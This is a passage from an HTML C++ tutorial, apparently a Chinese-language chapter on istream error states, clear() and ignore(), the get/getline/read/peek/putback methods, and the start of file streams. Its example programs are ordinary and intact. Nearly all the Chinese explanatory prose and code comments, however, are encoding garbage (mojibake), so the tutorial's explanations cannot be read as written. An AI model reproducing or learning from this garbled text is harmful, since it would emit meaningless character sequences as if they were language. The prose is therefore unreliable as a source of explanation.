<code>false</code>ï¼Œåˆ™è½¬æ¢ä¸º <code>true</code>ï¼›å¦åˆ™è½¬æ¢ä¸º <code>false</code>ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥åœ¨ <code>if(cin)</code> æˆ– <code>while(cin &gt;&gt; value)</code> ä¸­ä½¿ç”¨æµå¯¹è±¡çš„åŸå› ã€‚</li><li>  <strong><code>operator!()</code>:</strong> é‡è½½çš„é€»è¾‘éè¿ç®—ç¬¦ã€‚å¦‚æœ <code>fail()</code> è¿”å› <code>true</code>ï¼Œåˆ™ <code>!cin</code> ä¸º <code>true</code>ã€‚</li></ul><p><strong>æ¸…é™¤æµçŠ¶æ€:</strong></p><p>å½“æµè¿›å…¥ <code>failbit</code> æˆ– <code>badbit</code> çŠ¶æ€åï¼Œåç»­çš„ I/O æ“ä½œé€šå¸¸ä¼šç«‹å³å¤±è´¥ã€‚ä¸ºäº†ç»§ç»­ä½¿ç”¨è¯¥æµï¼Œå¿…é¡»<strong>æ¸…é™¤</strong>é”™è¯¯çŠ¶æ€ã€‚</p><ul><li>  <strong><code>clear(iostate state = goodbit)</code>:</strong> é‡ç½®æµçš„çŠ¶æ€ä½ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ˆä¸å¸¦å‚æ•°æˆ–å‚æ•°ä¸º <code>goodbit</code>ï¼‰ï¼Œå®ƒä¼šæ¸…é™¤æ‰€æœ‰é”™è¯¯ä½ (<code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)ï¼Œä½¿æµæ¢å¤åˆ° <code>good()</code> çŠ¶æ€ã€‚ä¹Ÿå¯ä»¥ç”¨å®ƒæ¥è®¾ç½®ç‰¹å®šçš„çŠ¶æ€ä½ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šå¤„ç†è¾“å…¥é”™è¯¯</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // for numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter an integer: &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number)) &#123; <span class="comment">// å¦‚æœè¯»å–å¤±è´¥ (cin è¿”å› false)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please enter an integer: &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. æ¸…é™¤é”™è¯¯çŠ¶æ€</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„é”™è¯¯è¾“å…¥</span></span><br><span class="line">        <span class="comment">// è¯»å–å¹¶å¿½ç•¥ç›´åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦æˆ–ç¼“å†²åŒºç»“æŸçš„æ‰€æœ‰å­—ç¬¦</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ªç¯ä¼šä¸€ç›´è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œç›´åˆ°æˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°ä¸ºæ­¢ã€‚å…³é”®åœ¨äºè¯»å–å¤±è´¥åï¼Œå¿…é¡»å…ˆ <code>clear()</code> é”™è¯¯æ ‡å¿—ï¼Œç„¶å <code>ignore()</code> æ‰å¯¼è‡´é”™è¯¯çš„æ— æ•ˆè¾“å…¥ï¼Œå¦åˆ™ä¸‹ä¸€æ¬¡å¾ªç¯çš„ <code>cin &gt;&gt; number</code> è¿˜ä¼šå› ä¸ºåŒæ ·çš„åŸå› å¤±è´¥ã€‚</p><h3 id="17-3-3-å…¶ä»–-istream-ç±»æ–¹æ³•"><a href="#17-3-3-å…¶ä»–-istream-ç±»æ–¹æ³•" class="headerlink" title="17.3.3 å…¶ä»– istream ç±»æ–¹æ³•"></a>17.3.3 å…¶ä»– istream ç±»æ–¹æ³•</h3><p>é™¤äº† <code>&gt;&gt;</code> è¿ç®—ç¬¦ï¼Œ<code>istream</code> ç±»è¿˜æä¾›äº†å…¶ä»–ç”¨äºè¾“å…¥çš„æˆå‘˜å‡½æ•°ï¼Œå®ƒä»¬æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶ã€‚</p><h4 id="1-å•å­—ç¬¦è¾“å…¥-get"><a href="#1-å•å­—ç¬¦è¾“å…¥-get" class="headerlink" title="1. å•å­—ç¬¦è¾“å…¥: get()"></a>1. å•å­—ç¬¦è¾“å…¥: <code>get()</code></h4><p><code>get()</code> æœ‰å‡ ä¸ªç‰ˆæœ¬ç”¨äºè¯»å–å•ä¸ªå­—ç¬¦ï¼š</p><ul><li>  <strong><code>int get()</code>:</strong> è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆå³ä½¿æ˜¯ç©ºç™½å­—ç¬¦ï¼‰ï¼Œå¹¶å°†å…¶ä½œä¸º <code>int</code> ç±»å‹è¿”å›ã€‚å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› <code>EOF</code> (ä¸€ä¸ªç‰¹æ®Šçš„è´Ÿæ•´æ•°å¸¸é‡ï¼Œå®šä¹‰åœ¨ <code>&lt;iostream&gt;</code> æˆ– <code>&lt;cstdio&gt;</code> ä¸­)ã€‚</li><li>  <strong><code>istream&amp; get(char&amp; ch)</code>:</strong> è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆå³ä½¿æ˜¯ç©ºç™½å­—ç¬¦ï¼‰ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ <code>ch</code> ä¸­ã€‚è¿”å› <code>istream</code> å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœè¯»å–å¤±è´¥ï¼ˆå¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œä¼šè®¾ç½® <code>failbit</code>ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter characters (Ctrl+D/Ctrl+Z to end):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ get(char&amp;)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.get(ch)) &#123; <span class="comment">// è¯»å–æˆåŠŸåˆ™å¾ªç¯ç»§ç»­</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.put(ch); <span class="comment">// é€ä¸ªè¾“å‡ºè¯»åˆ°çš„å­—ç¬¦</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnd of input (using get(char&amp;)).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.clear(); <span class="comment">// æ¸…é™¤ eof çŠ¶æ€ä»¥ä¾¿ç»§ç»­æ¼”ç¤º</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter characters again:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ int get()</span></span><br><span class="line">    <span class="keyword">int</span> char_code;</span><br><span class="line">    <span class="keyword">while</span> ((char_code = <span class="built_in">std</span>::<span class="built_in">cin</span>.get()) != EOF) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(char_code));</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnd of input (using int get()).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get()</code> ä¸ä¼šè·³è¿‡ç©ºç™½å­—ç¬¦ã€‚</p><h4 id="2-å­—ç¬¦ä¸²è¾“å…¥-get-å’Œ-getline"><a href="#2-å­—ç¬¦ä¸²è¾“å…¥-get-å’Œ-getline" class="headerlink" title="2. å­—ç¬¦ä¸²è¾“å…¥: get() å’Œ getline()"></a>2. å­—ç¬¦ä¸²è¾“å…¥: <code>get()</code> å’Œ <code>getline()</code></h4><p><code>istream</code> æä¾›äº†ç”¨äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰çš„ <code>get()</code> å’Œ <code>getline()</code> ç‰ˆæœ¬ã€‚</p><ul><li><p><strong><code>istream&amp; get(char* s, streamsize n, char delim = &#39;\n&#39;)</code>:</strong></p><ul><li>  ä»è¾“å…¥æµè¯»å–å­—ç¬¦ï¼Œå­˜å‚¨åˆ°å­—ç¬¦æ•°ç»„ <code>s</code> ä¸­ã€‚</li><li>  æœ€å¤šè¯»å– <code>n-1</code> ä¸ªå­—ç¬¦ï¼ˆä¸ºæœ«å°¾çš„ç©ºå­—ç¬¦ <code>\0</code> ç•™å‡ºç©ºé—´ï¼‰ã€‚</li><li>  é‡åˆ°åˆ†éš”ç¬¦ <code>delim</code> æ—¶åœæ­¢è¯»å–ã€‚</li><li>  <strong>åˆ†éš”ç¬¦ <code>delim</code> ä¼šè¢«ç•™åœ¨è¾“å…¥æµä¸­</strong>ï¼Œä¸ä¼šè¢«è¯»å–åˆ° <code>s</code> ä¸­ã€‚</li><li>  æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ <code>\0</code>ã€‚</li><li>  å¦‚æœå› ä¸ºè¯»å–äº† <code>n-1</code> ä¸ªå­—ç¬¦è€Œåœæ­¢ï¼Œä¼šè®¾ç½® <code>failbit</code>ã€‚</li></ul></li><li><p><strong><code>istream&amp; getline(char* s, streamsize n, char delim = &#39;\n&#39;)</code>:</strong></p><ul><li>  ä¸ <code>get()</code> ç±»ä¼¼ï¼Œæœ€å¤šè¯»å– <code>n-1</code> ä¸ªå­—ç¬¦ã€‚</li><li>  é‡åˆ°åˆ†éš”ç¬¦ <code>delim</code> æ—¶åœæ­¢è¯»å–ã€‚</li><li>  <strong>åˆ†éš”ç¬¦ <code>delim</code> ä¼šä»è¾“å…¥æµä¸­è¢«è¯»å–å¹¶ä¸¢å¼ƒ</strong>ï¼Œä¸ä¼šå­˜å‚¨åœ¨ <code>s</code> ä¸­ã€‚</li><li>  æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ <code>\0</code>ã€‚</li><li>  å¦‚æœå› ä¸ºè¯»å–äº† <code>n-1</code> ä¸ªå­—ç¬¦è€Œåœæ­¢ï¼ˆåœ¨é‡åˆ°åˆ†éš”ç¬¦ä¹‹å‰ï¼‰ï¼Œä¼šè®¾ç½® <code>failbit</code>ã€‚</li></ul></li></ul><p><strong>ä¸»è¦åŒºåˆ«:</strong> <code>getline()</code> ä¼šè¯»å–å¹¶ä¸¢å¼ƒåˆ†éš”ç¬¦ï¼Œè€Œ <code>get()</code> ä¼šå°†åˆ†éš”ç¬¦ç•™åœ¨æµä¸­ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line1[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> line2[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter line 1: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(line1, <span class="number">50</span>); <span class="comment">// è¯»å–æ•´è¡Œï¼Œä¸¢å¼ƒæ¢è¡Œç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter line 2: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(line2, <span class="number">50</span>); <span class="comment">// è¯»å–æ•´è¡Œï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: &quot;</span> &lt;&lt; line1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 2: &quot;</span> &lt;&lt; line2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ get() ä¹‹åç¼“å†²åŒºçš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">char</span> next_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character after get(): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(next_char); <span class="comment">// è¯»å–ç•™åœ¨ç¼“å†²åŒºçš„æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="keyword">if</span> (next_char == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;\\n&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; next_char &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> è¿™äº›æ˜¯ç”¨äº C é£æ ¼å­—ç¬¦ä¸²çš„ç‰ˆæœ¬ã€‚å¯¹äº <code>std::string</code> å¯¹è±¡ï¼Œåº”ä½¿ç”¨å…¨å±€çš„ <code>getline(cin, str)</code> å‡½æ•°ï¼ˆå¦‚ 16.1 èŠ‚æ‰€è¿°ï¼‰ã€‚</p><h3 id="17-3-4-å…¶ä»–-istream-æ–¹æ³•"><a href="#17-3-4-å…¶ä»–-istream-æ–¹æ³•" class="headerlink" title="17.3.4 å…¶ä»– istream æ–¹æ³•"></a>17.3.4 å…¶ä»– istream æ–¹æ³•</h3><ul><li><p>  <strong><code>read(char* s, streamsize n)</code>:</strong> ä»æµä¸­è¯»å–<strong>ç²¾ç¡® <code>n</code> ä¸ªå­—èŠ‚</strong>ï¼Œå¹¶å­˜å‚¨åˆ°ä» <code>s</code> å¼€å§‹çš„å†…å­˜ä¸­ã€‚å®ƒ<strong>ä¸ä¼š</strong>åœ¨é‡åˆ°ç©ºå­—ç¬¦æˆ–åˆ†éš”ç¬¦æ—¶åœæ­¢ï¼Œä¹Ÿä¸ä¼šæ·»åŠ ç©ºå­—ç¬¦ã€‚ä¸»è¦ç”¨äºè¯»å–<strong>äºŒè¿›åˆ¶æ•°æ®</strong>ã€‚å¦‚æœè¯»å–çš„å­—èŠ‚æ•°å°‘äº <code>n</code>ï¼ˆä¾‹å¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰ï¼Œä¼šè®¾ç½® <code>eofbit</code> å’Œ <code>failbit</code>ã€‚</p></li><li><p>  <strong><code>peek()</code>:</strong> è¿”å›è¾“å…¥æµä¸­çš„<strong>ä¸‹ä¸€ä¸ªå­—ç¬¦</strong>çš„æ•´æ•°å€¼ï¼Œä½†<strong>ä¸ä»æµä¸­ç§»é™¤</strong>è¯¥å­—ç¬¦ã€‚å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› <code>EOF</code>ã€‚å¯ç”¨äºåœ¨å®é™…è¯»å–å‰æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚</p></li><li><p>  <strong><code>gcount()</code>:</strong> è¿”å›<strong>ä¸Šä¸€æ¬¡æœªæ ¼å¼åŒ–è¯»å–æ“ä½œ</strong>ï¼ˆå¦‚ <code>get()</code>, <code>getline()</code>, <code>read()</code>ï¼‰å®é™…è¯»å–çš„<strong>å­—ç¬¦æ•°</strong>ã€‚å¯¹äº <code>&gt;&gt;</code> è¿ç®—ç¬¦æ— æ•ˆã€‚</p></li><li><p>  <strong><code>putback(char c)</code>:</strong> å°†å­—ç¬¦ <code>c</code> <strong>æ”¾å›</strong>è¾“å…¥æµä¸­ï¼Œä½¿å…¶æˆä¸ºä¸‹ä¸€ä¸ªè¢«è¯»å–çš„å­—ç¬¦ã€‚é€šå¸¸åªèƒ½æ”¾å›ä¸Šä¸€ä¸ªè¯»å–çš„å­—ç¬¦ã€‚</p></li><li><p><strong><code>ignore(streamsize n = 1, int delim = EOF)</code>:</strong> è¯»å–å¹¶<strong>ä¸¢å¼ƒ</strong>è¾“å…¥æµä¸­çš„å­—ç¬¦ã€‚</p><ul><li>  æœ€å¤šä¸¢å¼ƒ <code>n</code> ä¸ªå­—ç¬¦ã€‚</li><li>  å¦‚æœåœ¨æ­¤ä¹‹å‰é‡åˆ°å¹¶è¯»å–äº†åˆ†éš”ç¬¦ <code>delim</code>ï¼Œåˆ™åœæ­¢ä¸¢å¼ƒã€‚</li><li>  åˆ†éš”ç¬¦ <code>delim</code> æœ¬èº«ä¹Ÿä¼šè¢«ä¸¢å¼ƒã€‚</li><li>  å¸¸ç”¨äºæ¸…é™¤ç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥æˆ–è·³è¿‡ä¸éœ€è¦çš„éƒ¨åˆ†ã€‚</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter some text (e.g., abcdefghij): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.read(buffer, <span class="number">5</span>); <span class="comment">// è¯»å– 5 ä¸ªå­—èŠ‚åˆ° buffer</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">cin</span>.gcount() &lt;&lt; <span class="string">&quot; bytes: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.write(buffer, <span class="built_in">std</span>::<span class="built_in">cin</span>.gcount()) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºè¯»å–çš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> next = <span class="built_in">std</span>::<span class="built_in">cin</span>.peek(); <span class="comment">// æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next char (peek): &#x27;&quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(next) &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> actual_next;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(actual_next); <span class="comment">// å®é™…è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Actual next char (get): &#x27;&quot;</span> &lt;&lt; actual_next &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.putback(actual_next); <span class="comment">// å°†å­—ç¬¦æ”¾å›</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(actual_next); <span class="comment">// å†æ¬¡è¯»å–</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read again after putback: &#x27;&quot;</span> &lt;&lt; actual_next &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Ignoring rest of the line...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// å¿½ç•¥åˆ°è¡Œå°¾</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a final character: &quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> final_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; final_char; <span class="comment">// ç°åœ¨å¯ä»¥è¯»å–æ–°è¡Œçš„å­—ç¬¦äº†</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final char: &quot;</span> &lt;&lt; final_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç»„åˆä½¿ç”¨ <code>cin &gt;&gt;</code> å’Œè¿™äº› <code>istream</code> æˆå‘˜å‡½æ•°ï¼Œå¯ä»¥å®ç°çµæ´»å¤šæ ·çš„è¾“å…¥å¤„ç†é€»è¾‘ï¼Œå¹¶èƒ½æœ‰æ•ˆåœ°å¤„ç†è¾“å…¥é”™è¯¯ã€‚</p><h2 id="17-4-æ–‡ä»¶è¾“å…¥å’Œè¾“å‡º"><a href="#17-4-æ–‡ä»¶è¾“å…¥å’Œè¾“å‡º" class="headerlink" title="17.4 æ–‡ä»¶è¾“å…¥å’Œè¾“å‡º"></a>17.4 æ–‡ä»¶è¾“å…¥å’Œè¾“å‡º</h2><p>é™¤äº†ä¸æ§åˆ¶å°è¿›è¡Œäº¤äº’ï¼ˆ<code>cin</code>, <code>cout</code>ï¼‰ï¼Œç¨‹åºç»å¸¸éœ€è¦ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®æˆ–å°†æ•°æ®å†™å…¥æ–‡ä»¶ã€‚C++ çš„ iostream åº“é€šè¿‡ <code>&lt;fstream&gt;</code> å¤´æ–‡ä»¶æä¾›äº†ç”¨äºæ–‡ä»¶ I/O çš„ç±»ã€‚</p><p><code>&lt;fstream&gt;</code> å®šä¹‰äº†ä¸‰ä¸ªä¸»è¦çš„ç±»ï¼š</p><ol><li> <strong><code>ifstream</code> (input file stream):</strong> ç»§æ‰¿è‡ª <code>istream</code>ï¼Œä¸“é—¨ç”¨äºä»æ–‡ä»¶<strong>è¯»å–</strong>æ•°æ®ã€‚</li><li> <strong><code>ofstream</code> (output file stream):</strong> ç»§æ‰¿è‡ª <code>ostream</code>ï¼Œä¸“é—¨ç”¨äºå‘æ–‡ä»¶<strong>å†™å…¥</strong>æ•°æ®ã€‚</li><li> <strong><code>fstream</code>:</strong> ç»§æ‰¿è‡ª <code>iostream</code>ï¼Œå¯ä»¥åŒæ—¶æ”¯æŒæ–‡ä»¶çš„<strong>è¯»å–å’Œå†™å…¥</strong>ã€‚</li></ol><p>è¿™äº›æ–‡ä»¶æµç±»çš„ä½¿ç”¨æ–¹å¼ä¸ <code>cin</code> å’Œ <code>cout</code> éå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒä»¬ç»§æ‰¿äº†ç›¸åŒçš„åŸºç±»å¹¶æ”¯æŒç›¸åŒçš„æ“ä½œç¬¦ï¼ˆå¦‚ <code>&lt;&lt;</code>, <code>&gt;&gt;</code>) å’Œæ–¹æ³•ï¼ˆå¦‚ <code>get()</code>, <code>getline()</code>, <code>write()</code>, <code>read()</code>ï¼‰ã€‚</p><h3 id="17-4-1-ç®€å•çš„æ–‡ä»¶-I-O"><a href="#17-4-1-ç®€å•çš„æ–‡ä»¶-I-O" class="headerlink" title="17.4.1 ç®€å•çš„æ–‡ä»¶ I/O"></a>17.4.1 ç®€å•çš„æ–‡ä»¶ I/O</h3><p>è¿›è¡Œæ–‡ä»¶ I/O 